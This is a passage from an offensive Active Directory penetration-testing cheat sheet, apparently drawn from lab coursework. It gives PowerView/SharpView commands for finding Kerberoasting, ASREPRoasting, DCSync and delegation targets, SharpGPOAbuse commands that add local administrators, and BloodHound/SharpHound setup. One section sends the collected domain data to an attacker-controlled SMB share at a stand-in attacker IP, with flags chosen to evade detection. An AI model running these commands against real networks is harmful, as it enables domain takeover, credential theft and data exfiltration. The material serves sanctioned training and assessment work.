2.2.5 Unconstrained Delegation Users

# Find users with unconstrained delegation
PS C:\Users\[user]> .\SharpView.exe Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

2.2.6 Passwords in Description Fields

# Find users with non-null description fields (may contain credentials)
PS C:\Users\[user]> Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}

2.2.7 Kerberoastable Users (SPNs)

# Find users with SPNs set (Kerberoasting targets)
PS C:\Users\[user]> .\SharpView.exe Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname

2.2.8 Foreign Domain Users

# Find users from other domains with group membership in the current domain
PS C:\Users\[user]> Find-ForeignGroup

# Resolve a foreign SID to a username
PS C:\Users\[user]> Convert-SidToName S-1-5-21-888139820-103978830-333442103-1602

# Find Kerberoastable users in a trusted forest
PS C:\Users\[user]> Get-DomainUser -SPN -Domain freightlogistics.local | select samaccountname,memberof,serviceprincipalname | fl

2.2.9 Password Set Times

Analyzing password set times is critical for targeted password sprays. Accounts set at the same time were likely provisioned by help desk and may share a password. Old passwords indicate weak or reused credentials.

# List all users sorted by password last set time
PS C:\Users\[user]> Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | Sort-Object -Property pwdlastset

# Show users whose password was set more than 90 days ago
PS C:\Users\[user]> Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-90) }
Note: Several passwords set at the same time likely means the help desk provisioned them - they may all share the same default password. A password set 2+ years ago is a priority target for spraying. If an administrator's user account and admin account share a password-set timestamp, they almost certainly use the same password for both.

Methodology

  • Count domain users and enumerate all key properties to CSV: 
    (Get-DomainUser).count
Get-DomainUser * -Domain [domain] | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-Csv .\domain_users.csv -NoTypeInformation
  • Find users with passwords in description fields: 
    Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}
  • Find ASREPRoastable users (no pre-auth required): 
    .\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof
  • Find Kerberoastable users (SPNs set): 
    .\SharpView.exe Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname
  • Find users with unconstrained and constrained delegation: 
    .\SharpView.exe Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
.\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
  • Find foreign users in domain groups and Kerberoastable accounts in trusted forests: 
    Find-ForeignGroup
Get-DomainUser -SPN -Domain freightlogistics.local | select samaccountname,memberof,serviceprincipalname | fl
  • Analyze password set times for spray targeting: 
    Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname,pwdlastset,lastlogon | Sort-Object -Property pwdlastset
Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname,pwdlastset,lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-90) }

2.3 Enumerating AD Groups

Group membership determines what resources users can access. Nested groups, managed groups, and privileged groups are high-value enumeration targets.

2.3.1 Domain Groups

# List all domain group names
PS C:\Users\[user]> Get-DomainGroup -Properties Name

# View all parameters for Get-DomainGroupMember
PS C:\Users\[user]> .\SharpView.exe Get-DomainGroupMember -Help

# Enumerate members of a specific group
PS C:\Users\[user]> .\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'
Note: The presence of Exchange-related groups (Exchange Trusted Subsystem, Exchange Windows Permissions) signals high-value targets. Membership in these groups often grants WriteDacl over the domain object, enabling DCSync.

2.3.2 Protected Groups (AdminCount=1)

# Find all groups with AdminCount=1 (protected by SDProp)
PS C:\Users\[user]> .\SharpView.exe Get-DomainGroup -AdminCount

2.3.3 Managed Security Groups

Managed security groups have a non-administrator delegated as group manager via the managedBy attribute. If the manager has GenericWrite on the group, they can add members - a useful lateral movement path.

# List all managed security groups
PS C:\Users\[user]> Find-ManagedSecurityGroups | select GroupName

# Get full managed group details including manager information
PS C:\Users\[user]> Get-DomainManagedSecurityGroup

# Convert manager name to SID, then check their ACL rights on the group
PS C:\Users\[user]> ConvertTo-SID joe.evans
PS C:\Users\[user]> $sid = ConvertTo-SID joe.evans
PS C:\Users\[user]> Get-DomainObjectAcl -Identity 'Security Operations' | ?{ $_.SecurityIdentifier -eq $sid}

2.3.4 Local Groups

# List local groups on a remote host
PS C:\Users\[user]> Get-NetLocalGroup -ComputerName WS01 | select GroupName

# Enumerate local group members on a remote host
PS C:\Users\[user]> .\SharpView.exe Get-NetLocalGroupMember -ComputerName WS01

# Convert a local group member SID to a username
PS C:\Users\[user]> Convert-SidToName S-1-5-21-2974783224-3764228556-2640795941-2040

# Find all hosts where a specific user has local admin access
PS C:\Users\[user]> $sid = Convert-NameToSid [user]
PS C:\Users\[user]> $computers = Get-DomainComputer -Properties dnshostname | select -ExpandProperty dnshostname
PS C:\Users\[user]> foreach ($line in $computers) {Get-NetLocalGroupMember -ComputerName $line | ? {$_.SID -eq $sid}}

2.3.5 Group Membership Date (Incident Response Aid)

PowerView cannot pull the date a user was added to a group natively. The Get-ADGroupMemberDate module fills this gap. This is useful for IR to correlate with Event ID 4728/4738.

# Import the module the same way as PowerView, then:
Get-ADGroupMemberDate -Group "Help Desk" -DomainController [dc].[domain]

# Filter to a specific user who is not absent
Get-ADGroupMemberDate -Group "Help Desk" -DomainController [dc].[domain] | ? { ($_.Username -match '[user]') -And ($_.State -NotMatch 'ABSENT') }

Methodology

  • List all domain groups and note high-value ones (Exchange, Protected Users, LAPS Admins, Help Desk, Security Operations): 
    Get-DomainGroup -Properties Name
  • Find all AdminCount=1 protected groups: 
    .\SharpView.exe Get-DomainGroup -AdminCount
  • Enumerate members of high-value groups: 
    .\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'
.\SharpView.exe Get-DomainGroupMember -Identity 'Domain Admins'
  • Find managed security groups and check if manager has GenericWrite: 
    Find-ManagedSecurityGroups | select GroupName
Get-DomainManagedSecurityGroup
$sid = ConvertTo-SID joe.evans
Get-DomainObjectAcl -Identity 'Security Operations' | ?{ $_.SecurityIdentifier -eq $sid}
  • Enumerate local group membership on target hosts: 
    Get-NetLocalGroup -ComputerName WS01 | select GroupName
.\SharpView.exe Get-NetLocalGroupMember -ComputerName WS01
  • Find all hosts where a controlled user has local admin: 
    $sid = Convert-NameToSid [user]
$computers = Get-DomainComputer -Properties dnshostname | select -ExpandProperty dnshostname
foreach ($line in $computers) {Get-NetLocalGroupMember -ComputerName $line | ? {$_.SID -eq $sid}}

2.4 Enumerating AD Computers

Computer objects reveal operating system versions, delegation configurations, and last-logon staleness - all factors for selecting attack targets.

2.4.1 Domain Computer Information

# View all parameters for Get-DomainComputer
PS C:\Users\[user]> .\SharpView.exe Get-DomainComputer -Help

# Enumerate computers with key properties
PS C:\Users\[user]> .\SharpView.exe Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol

# Export to CSV
PS C:\Users\[user]> Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol | Export-Csv .\domain_computers.csv -NoTypeInformation

# Quick view of hostname and UAC
PS C:\Users\[user]> Get-DomainComputer | select dnshostname, useraccountcontrol

2.4.2 Key Computer Attributes for Attack Planning

Attribute Attack Relevance
LastLogonTimeStamp 90+ days old = stale, unpatched machine. Admins may auto-disable at 90 days - check first. Combine with OS and WhenCreated to identify soft targets.
OperatingSystem Windows 7 with recent lastlogon = candidate for EternalBlue or weak logging. Windows 10 Pro (vs Enterprise) lacks Credential Guard by default - preferred target for credential theft.
WhenCreated Older machines deviate more from standard builds: weaker local admin passwords, more local admins, vulnerable software, more data stored locally.

2.4.3 Unconstrained Delegation Computers

# Find computers with unconstrained delegation set
PS C:\Users\[user]> .\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
Note: Domain controllers always have unconstrained delegation set - this is expected. Any non-DC computer with this flag is a high-value target for token capture attacks.

2.4.4 Constrained Delegation Computers

# Find computers trusted to authenticate for other principals
PS C:\Users\[user]> Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol

2.4.5 Admin Access and Sessions

# Test if current user has local admin on a specific host
PS C:\Users\[user]> Test-AdminAccess -ComputerName SQL01

# Enumerate shares on a remote host
PS C:\Users\[user]> .\SharpView.exe Get-NetShare -ComputerName [dc]

# Find where domain users are currently logged in
PS C:\Users\[user]> Find-DomainUserLocation

Methodology

  • Enumerate all computers with key properties and export to CSV: 
    .\SharpView.exe Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol | Export-Csv .\domain_computers.csv -NoTypeInformation
  • Find computers with unconstrained delegation (non-DC targets): 
    .\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
  • Find computers with constrained delegation: 
    Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol
  • Test local admin access and find active user sessions: 
    Test-AdminAccess -ComputerName SQL01
Find-DomainUserLocation
  • Enumerate shares on domain computers: 
    .\SharpView.exe Get-NetShare -ComputerName [dc]

2.5 Enumerating Domain ACLs

Access Control Lists (ACLs) in AD consist of Access Control Entries (ACEs), each mapping a security principal to a permission on an object. There are two ACL types:

ACL Type Description
DACL (Discretionary Access Control List) Defines which security principals are granted or denied access to an object
SACL (System Access Control List) Allows administrators to log access attempts made to secured objects

2.5.1 ACL Abuse Overview

ACE Type Abuse Method
ForceChangePassword Set-DomainUserPassword
Add Members Add-DomainGroupMember
GenericAll Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite Set-DomainObject
WriteOwner Set-DomainObjectOwner
WriteDACL Add-DomainObjectACL
AllExtendedRights Set-DomainUserPassword or Add-DomainGroupMember

2.5.2 Enumerating ACLs with Built-In Cmdlets

# Get ACL for a specific user filtered to a specific identity
PS C:\Users\[user]> (Get-ACL "AD:$((Get-ADUser [user]).distinguishedname)").access | ? {$_.IdentityReference -eq "[DOMAIN]\[user]"}

# Find all identities with WriteProperty or GenericAll over a user
PS C:\Users\[user]> (Get-ACL "AD:$((Get-ADUser [user]).distinguishedname)").access | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W

2.5.3 Enumerating ACLs with PowerView and SharpView

# Get ACLs on a specific user with GUID resolution
PS C:\Users\[user]> Get-DomainObjectAcl -Identity [user] -Domain [domain] -ResolveGUIDs

# Find interesting ACLs across the domain (non-built-in objects with modification rights)
PS C:\Users\[user]> Find-InterestingDomainAcl -Domain [domain] -ResolveGUIDs

2.5.4 ACLs on File Shares

# List shares on a host
PS C:\Users\[user]> Get-NetShare -ComputerName SQL01

# Check ACLs on a specific share
PS C:\Users\[user]> Get-PathAcl "\\SQL01\DB_backups"

2.5.5 DCSync Rights Enumeration

A DCSync attack requires an account to hold a combination of three replication rights on the domain object. Identifying who has these rights is critical.

Right Required
Replicating Directory Changes (DS-Replication-Get-Changes)
Replicating Directory Changes All (DS-Replication-Get-Changes-All)
Replicating Directory Changes In Filtered Set (DS-Replication-Get-Changes-In-Filtered-Set)
 
# Find all users with GenericAll or replication rights on the domain object
PS C:\Users\[user]> Get-ObjectACL "DC=[domain],DC=[tld]" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object SecurityIdentifier | Sort-Object -Property SecurityIdentifier -Unique

# Convert a single SID
PS C:\Users\[user]> convertfrom-sid S-1-5-21-2974783224-3764228556-2640795941-1883

# Convert all SIDs from the DCSync rights query at once
PS C:\Users\[user]> $dcsync = Get-ObjectACL "DC=[domain],DC=[tld]" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
PS C:\Users\[user]> Convert-SidToName $dcsync
Note: If a member of Exchange Trusted Subsystem is compromised, that account likely has WriteDacl over the domain object - grant a controlled account DCSync rights, then run DCSync to fully compromise the domain.

2.5.6 Leveraging ACLs

Less destructive alternatives to password changes when holding GenericAll or GenericWrite over a user:

  • Set a fake SPN and perform targeted Kerberoasting
  • Modify userAccountControl to disable pre-auth and perform targeted ASREPRoasting
  • On a computer object: perform a Kerberos Resource-based Constrained Delegation attack
  • On a GPO with write access: use SharpGPOAbuse to add local admin, add user rights (SeDebugPrivilege, SeTakeOwnershipPrivilege), or create a startup script
Note: If a password change is unavoidable: after domain compromise, run DCSync to pull the account's password history, then use Mimikatz LSADUMP::ChangeNTLM or LSADUMP::SetNTLM to restore the previous password.

Methodology

  • Find interesting domain ACLs (non-built-in objects with modification rights): 
    Find-InterestingDomainAcl -Domain [domain] -ResolveGUIDs
  • Get ACLs on a specific user with GUID resolution: 
    Get-DomainObjectAcl -Identity [user] -Domain [domain] -ResolveGUIDs
  • Find all principals with WriteProperty or GenericAll over a target user: 
    (Get-ACL "AD:$((Get-ADUser [user]).distinguishedname)").access | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W
  • Enumerate DCSync-capable accounts on the domain object: 
    $dcsync = Get-ObjectACL "DC=[domain],DC=[tld]" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
Convert-SidToName $dcsync
  • Check ACLs on file shares for sensitive access: 
    Get-NetShare -ComputerName SQL01
Get-PathAcl "\\SQL01\DB_backups"
  • Check managed group manager ACL for GenericWrite: 
    $sid = ConvertTo-SID joe.evans
Get-DomainObjectAcl -Identity 'Security Operations' | ?{ $_.SecurityIdentifier -eq $sid}

2.6 Enumerating Group Policy Objects (GPOs)

Group Policy Objects enforce configuration baselines across OUs. A single misconfigured GPO with write access can be used for lateral movement, privilege escalation, or persistence. Exchange installs and one-off admin scripts are common sources of exploitable GPO paths.

2.6.1 Gathering GPO Data

# List all GPO display names in the domain
PS C:\Users\[user]> Get-DomainGPO | select displayname

# Also via SharpView
PS C:\Users\[user]> .\SharpView.exe Get-DomainGPO | findstr displayname

# Get GPOs applied to a specific computer
PS C:\Users\[user]> Get-DomainGPO -ComputerName WS01 | select displayname

# Get GPO details for a specific computer (built-in, no tools required)
C:\> gpresult /r /user:[user]
C:\> gpresult /r /S WS01

# Full output example
PS C:\Users\[user]> gpresult /r /S WS01

# Output as HTML report
# gpresult /h gpo_report.html
Note: GPO names reveal security controls deployed across the domain. Look for gaps - hosts or OUs where controls like LAPS, AppLocker, or PowerShell Logging are not applied. These are preferred staging grounds.

2.6.2 GPO Permissions

# Check if the Domain Users group (SID -513) has rights over any GPO
PS C:\Users\[user]> Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq 'S-1-5-21-2974783224-3764228556-2640795941-513'}

# Resolve the GPO GUID to a display name
PS C:\Users\[user]> Get-GPO -Guid 831DE3ED-40B1-4703-ABA7-8EA13B2EB118

2.6.3 GPO Abuse

With write rights over a GPO linked to a target OU, use SharpGPOAbuse to:

Attack SharpGPOAbuse Flag
Add user rights (e.g., SeDebugPrivilege)--AddUserRights
Add local admin on machines where GPO applies--AddLocalAdmin
Add a computer startup task--AddComputerTask
 
# Example: Add a user to local admins via GPO scheduled task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "GPNAME"

2.6.4 Hidden GPO Code Execution Paths

GPOs may reference scripts or files on network shares. If those files are writable by non-admins, they represent a code execution path even if the GPO itself is not writable. Common paths to check:

GPO Code Execution Path
Registry Autoruns
Software Installation (MSI from share)
Scripts in Startup/Shutdown for Machine or User
Shortcuts on Desktops pointing to files
Scheduled Tasks
Note: Tools that check GPO write access often miss whether the executables or scripts referenced by the GPO are writable by Domain Users, Domain Computers, or Authenticated Users. Always check share permissions on any file the GPO references.

Methodology

  • List all GPO names and identify security control gaps: 
    Get-DomainGPO | select displayname
.\SharpView.exe Get-DomainGPO | findstr displayname
  • Check GPOs applied to specific computers: 
    Get-DomainGPO -ComputerName WS01 | select displayname
gpresult /r /S WS01
  • Check if Domain Users have write rights over any GPO: 
    Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq 'S-1-5-21-2974783224-3764228556-2640795941-513'}
Get-GPO -Guid 831DE3ED-40B1-4703-ABA7-8EA13B2EB118
  • If writable GPO found, abuse with SharpGPOAbuse: 
    .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount controlled-user --GPOName "Screensaver"

2.7 Enumerating AD Trusts

Domain trusts link authentication systems between domains and forests. Misconfigured or overlooked trusts frequently provide lateral movement paths to adjacent domains.

2.7.1 Trust Types

Trust Type Description
Parent-child Domains within the same forest. Child domain has a two-way transitive trust with the parent domain.
Cross-link Trust between child domains to speed up authentication.
External Non-transitive trust between two separate domains in separate forests not joined by a forest trust. Uses SID filtering.
Tree-root Two-way transitive trust between a forest root domain and a new tree root domain.
Forest Transitive trust between two forest root domains.

2.7.2 Enumerating Trust Relationships

# List all trusts for the current domain
PS C:\Users\[user]> Get-DomainTrust

# Enumerate all trusts recursively across all reachable domains
PS C:\Users\[user]> Get-DomainTrustMapping

2.7.3 Trust Attack Paths

Scenario Attack
Parent-child bidirectional trust (same forest) Compromise child domain, use ExtraSids attack to escalate to parent domain via sidHistory injection (Enterprise Admins SID)
Forest bidirectional trust with forest-wide authentication Kerberoasting and ASREPRoasting across the trust; SID History abuse if SID filtering is not enabled
Any trust with user account overlap Password re-use: if same admin account name exists in both domains, credentials likely shared
Foreign group membership Accounts from Forest B in privileged groups of Forest A - compromising Forest A credentials may yield Forest B access

2.7.4 SID History Abuse

SID history stores old SIDs when accounts are migrated between domains. An attacker who can write to a user's sidHistory attribute (via Mimikatz) can inject a Domain Admin SID, making that account act as a DA when authenticating. This also works cross-forest if SID filtering is disabled.

Methodology

  • Map all trust relationships in the current domain and reachable domains: 
    Get-DomainTrust
Get-DomainTrustMapping
  • Find foreign users with group membership in current domain: 
    Find-ForeignGroup
Get-DomainForeignUser
  • Find Kerberoastable accounts in trusted forests: 
    Get-DomainUser -SPN -Domain freightlogistics.local | select samaccountname,memberof,serviceprincipalname | fl
  • Check for password re-use by identifying accounts with same name in multiple forests: 
    Get-DomainUser -Domain freightlogistics.local | select samaccountname | Sort-Object samaccountname

2.8 Domain and Environment Overview

Before diving into targeted enumeration, collect high-level domain and OU information to map the environment's structure.

# Get domain object information (name, DCs, children, FSMO roles)
PS C:\Users\[user]> .\SharpView.exe Get-Domain

# List all OU names to understand domain structure
PS C:\Users\[user]> .\SharpView.exe Get-DomainOU | findstr /b "name"

# Get domain policy (password policy, Kerberos policy)
PS C:\Users\[user]> Get-DomainPolicy

# Connect to lab (replace with current target IP and password)
xfreerdp /v:[target] /u:[user] /p:[password]

Methodology

  • Get domain structure and FSMO role owners: 
    .\SharpView.exe Get-Domain
  • Map all OUs to understand departmental structure: 
    .\SharpView.exe Get-DomainOU | findstr /b "name"
  • Check domain password and Kerberos policy: 
    Get-DomainPolicy

3. Active Directory BloodHound

3.1 BloodHound Overview

BloodHound is an open-source tool that uses graph theory to visualize relationships between Active Directory objects and identify attack paths that are difficult to detect through traditional enumeration. It was created by @_wald0, @harmj0y, and @CptJesus.

BloodHound stores data in Neo4j, a graph database that uses nodes (AD objects: users, groups, computers, etc.) and edges (relationships: MemberOf, AdminTo, etc.) to model the environment. Queries are written in Cypher Query Language, Neo4j's SQL-like graph query language.

ConceptDescription
NodeAn AD object (user, group, computer, OU, GPO, domain, container)
EdgeA relationship between nodes (MemberOf, AdminTo, ForceChangePassword, etc.)
Shortest PathBloodHound's core capability - finding the minimum-hop route between two nodes
CypherNeo4j query language used to retrieve and filter graph data
Note: As of version 4.0, BloodHound also supports Azure. SharpHound Common provides a shared codebase between the FOSS and Enterprise editions.

3.2 BloodHound Setup and Installation

BloodHound requires Java 11, Neo4j 4.4.x, and the BloodHound GUI. Neo4j 5 has severe performance regression issues - use 4.4.x.

3.2.1 Windows Installation

# Install Java silently
.\jdk-11.0.17_windows-x64_bin.exe /s

# Unzip Neo4j
Expand-Archive .\neo4j-community-4.4.16-windows.zip .

# Install Neo4j as a Windows service
.\neo4j-community-4.4.16\bin\neo4j.bat install-service

# Start the service
net start neo4j

Navigate to http://localhost:7474/, authenticate with neo4j:neo4j, and change the default password. Then download BloodHound from https://github.com/BloodHoundAD/BloodHound/releases, unzip, and run BloodHound.exe.

3.2.2 Linux Installation

# Add Java backports source
echo "deb http://httpredir.debian.org/debian stretch-backports main" | sudo tee -a /etc/apt/sources.list.d/stretch-backports.list
sudo apt-get update

# Add Neo4j 4.4 repo
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee -a /etc/apt/sources.list.d/neo4j.list
sudo apt-get update

# Install prerequisites
sudo apt-get install apt-transport-https

# List available Neo4j versions
sudo apt list -a neo4j

# Install Neo4j 4.4.16
sudo apt install neo4j=1:4.4.16 -y

# Select Java 11 as default
sudo update-alternatives --config java

# Run Neo4j as console application to verify startup
cd /usr/bin
sudo ./neo4j console

# Service management
sudo systemctl start neo4j
sudo systemctl stop neo4j
Note: To allow remote connections to Neo4j, edit /etc/neo4j/neo4j.conf and uncomment #dbms.default_listen_address=0.0.0.0.
# Unzip and launch BloodHound GUI on Linux
unzip BloodHound-linux-x64.zip
cd BloodHound-linux-x64/
./BloodHound --no-sandbox

3.2.3 Updating BloodHound (Linux)

wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee -a /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt install neo4j=1:4.4.16 -y

3.2.4 Recovering Neo4j Credentials

# 1. Stop neo4j
sudo systemctl stop neo4j

# 2. Edit /etc/neo4j/neo4j.conf - uncomment:
#    dbms.security.auth_enabled=false

# 3. Start neo4j console
sudo neo4j console

# 4. Navigate to http://localhost:7474/ and click Connect (no credentials)

# 5. Reset password via Cypher
# Run in browser console:
# ALTER USER neo4j SET PASSWORD 'Password123';

# 6. Stop neo4j, re-comment the auth line, restart

3.2.5 Quick-Start Installation (CAPE lab)

apt install bloodhound

# Neo4j setup
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
apt-get install apt-transport-https
sudo apt-get install neo4j

systemctl stop neo4j
sudo /usr/bin/neo4j console

# In a separate terminal
./BloodHound.bin --no-sandbox
# or
neo4j console
bloodhound

Methodology

  • Start Neo4j: 
    sudo systemctl start neo4j
# or: sudo neo4j console
  • Change default credentials at http://localhost:7474/ (default: neo4j:neo4j)
  • Launch BloodHound GUI and authenticate: 
    ./BloodHound --no-sandbox     # Linux
# or BloodHound.exe            # Windows
  • If credentials are lost, reset via dbms.security.auth_enabled=false in neo4j.conf, then run ALTER USER neo4j SET PASSWORD 'newpass';

3.3 SharpHound - Data Collection from Windows

SharpHound is the official C# data collector for BloodHound. It uses Windows API calls and LDAP queries to gather AD data. The BloodHound and SharpHound versions must match.

Three collector variants exist:

  • SharpHound.exe - Windows executable
  • SharpHound.ps1 - PowerShell script (loads into memory; latest releases no longer ship this)
  • AzureHound.ps1 - Azure data collection

3.3.1 Basic Enumeration

# Run with all defaults (collects: Group, LocalAdmin, Session, Trusts, ACL,
# Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote)
C:\Tools> SharpHound.exe

# Specify domain explicitly
C:\Tools> SharpHound.exe -d [domain]

# DCOnly - only queries DC, no lateral computer connections (low-noise)
C:\Tools> SharpHound.exe -c DCOnly

# All collection methods except GPOLocalGroup
C:\Tools> SharpHound.exe -c All

# ComputerOnly - sessions and local groups from domain-joined computers only
C:\Tools> SharpHound.exe -c ComputerOnly --computerfile computers.txt

Default collection gathers:

Data TypeDetails
Users & ComputersAll AD user and computer objects
Group MembershipAD security group memberships
Domain TrustsAll inter-domain trust relationships
ACLsAbusable permissions on AD objects
OU StructureFull OU tree
GPO LinksGroup Policy Object linkages
Object PropertiesMost relevant AD object attributes
Local GroupsLocal admins, RDP, DCOM, PSRemote from domain-joined hosts
SessionsActive user sessions on computers
SPNsAll Service Principal Names
Note: Gathering local group membership and active sessions from domain-joined machines requires Administrator rights on the target computer.

3.3.2 Collection Methods Reference

MethodDescription
DefaultGroup, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
AllAll methods except GPOLocalGroup
DCOnlyCollects from DC only - no lateral computer connections. Low traffic footprint.
ComputerOnlySessions and local groups from domain-joined computers only
GPOLocalGroupLocal group membership derived from GPO analysis
LoggedOnLogged-on sessions (requires admin on targets)

3.3.3 Key SharpHound Flags

FlagDescription
-c, --collectionmethodsCollection method(s) to use
-d, --domainTarget domain to enumerate
-s, --searchforestSearch all domains in the forest
--stealthSingle-threaded; prefer DCOnly. Reduced detection risk.
--ldapusername / --ldappasswordAlternate credentials for LDAP
--domaincontrollerTarget a specific DC by IP or FQDN
--ldapportOverride LDAP port (useful with port forwarding)
--secureldapUse LDAPS instead of LDAP
--computerfileFile of computer hostnames to enumerate
--memcacheKeep cache in memory, don't write to disk
--randomfilenamesRandomize output filenames
--outputprefixPrepend string to output filenames
--outputdirectoryOutput directory (can be a UNC share)
--zipfilenameCustom zip filename
--zippasswordPassword-protect the output zip
--nozipDon't zip output files
--throttleDelay (ms) after each computer request
--jitterPercentage jitter to add to throttle
--threadsNumber of threads (default: 50)
--excludedcsExclude DCs from session/localgroup enumeration
--collectallpropertiesCollect all LDAP properties from objects
-l, --LoopLoop computer collection
--loopdurationDuration for loop (default: 02:00:00)
--loopintervalSleep interval between loops (default: 00:00:30)
--ExcludeDomainControllersSkip DCs during collection

3.3.4 Stealth Output - Exfil to SMB Share

# On attacker machine - start SMB share with credentials
sudo impacket-smbserver share ./ -smb2support -user test -password test
# On Windows target - connect to share and run SharpHound
net use \\[target-ip]\share /user:test test

C:\Tools\SharpHound.exe --memcache --outputdirectory \\[target-ip]\share\ `
  --zippassword HackTheBox --outputprefix HTB --randomfilenames
# Unzip the password-protected archive on attacker side
unzip ./HTB_20230111113143_5yssigbd.w3f

3.3.5 Session Loop Collection

Sessions are ephemeral - they disappear within minutes of a user disconnecting. Use --Loop to catch sessions over time.

# Check for active sessions on current machine
net session

# Loop session collection for 1 hour, querying every minute
C:\Tools> SharpHound.exe -c Session --loop --loopduration 01:00:00 --loopinterval 00:01:00

3.3.6 Running from Non-Domain-Joined Systems

# Connect via RDP to target (non-domain system)
# xfreerdp /v:[target-ip]:13389 /u:haris /p:[password] /dynamic-resolution /drive:.,linux

# Spawn cmd with domain credentials using runas /netonly
C:\Users\[user]> runas /netonly /user:[DOMAIN]\[user]-student cmd.exe

# Verify network authentication
C:\Users\[user]> net view \\[domain]\

# Run SharpHound specifying the domain
C:\Tools> SharpHound.exe -d [domain]

3.3.7 Importing Data into BloodHound

# Start Neo4j service
net start neo4j

Launch C:\Tools\BloodHound\BloodHound.exe, authenticate (neo4j:Password123), then click the upload button and select the SharpHound zip file. BloodHound deduplicates - re-uploading adds only new data.

3.3.8 SharpHound with Specific Options

# Stealth run - DCOnly plus targeted ComputerOnly follow-up
C:\Tools> SharpHound.exe -c DCOnly --domain [domain]
C:\Tools> SharpHound.exe -c ComputerOnly --computerfile computers.txt

# Alternate credentials
C:\Tools> SharpHound.exe --ldapusername otheruser --ldappassword 'P@ssw0rd'

# Target specific DC (useful with port forwarding)
C:\Tools> SharpHound.exe --domaincontroller [target-ip] --ldapport 389

# GPO-based local group collection
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator `
  --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" `
  --GPOName "GPNAME"

Methodology

  • Run default SharpHound collection: 
    C:\Tools\SharpHound.exe -d <DOMAIN>
  • For noisy environments, use DCOnly first: 
    C:\Tools\SharpHound.exe -c DCOnly -d <DOMAIN>
  • If running from non-domain system, use runas /netonly: 
    runas /netonly /user:<DOMAIN>\<user> cmd.exe
  • Exfil output to attacker SMB share (stealth): 
    sudo impacket-smbserver share ./ -smb2support -user test -password test
    net use \\<ATTACKER_IP>\share /user:test test
C:\Tools\SharpHound.exe --memcache --outputdirectory \\<ATTACKER_IP>\share\ --zippassword HackTheBox --randomfilenames
  • Loop session collection to catch active logins: 
    C:\Tools\SharpHound.exe -c Session --loop --loopduration 01:00:00 --loopinterval 00:01:00
  • Import zip into BloodHound and start the Neo4j database: 
    net start neo4j
# Then upload via BloodHound GUI upload button

3.4 BloodHound.py - Data Collection from Linux

BloodHound.py is a Python-based collector by Dirk-jan Mollema, built on Impacket. It supports NTLM, Kerberos, hash, and ccache authentication.

3.4.1 Installation

# Install via pip
pip install bloodhound

# Install from source
git clone https://github.com/fox-it/BloodHound.py -q
cd BloodHound.py/
sudo python3 setup.py install

3.4.2 BloodHound.py Options

python3 bloodhound.py --help
FlagDescription
